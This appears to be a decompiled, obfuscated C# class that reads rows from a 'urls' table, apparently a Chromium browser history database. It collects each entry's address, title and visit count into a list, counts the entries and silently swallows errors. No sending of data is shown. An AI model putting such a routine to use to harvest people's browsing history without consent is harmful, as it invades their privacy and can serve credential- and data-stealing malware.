using System;
using System.Collections.Generic;

internal sealed class Class92
{
	public static List<Struct3> smethod_0(string string_0)
	{
		List<Struct3> list = new List<Struct3>();
		try
		{
			Class54 @class = Class55.smethod_0(string_0, "urls");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct3 item = default(Struct3);
				item.String_1 = Class87.smethod_2(@class.method_0(i, 1));
				item.String_0 = Class87.smethod_2(@class.method_0(i, 2));
				item.Int32_0 = Convert.ToInt32(@class.method_0(i, 3)) + 1;
				Class36.int_4++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
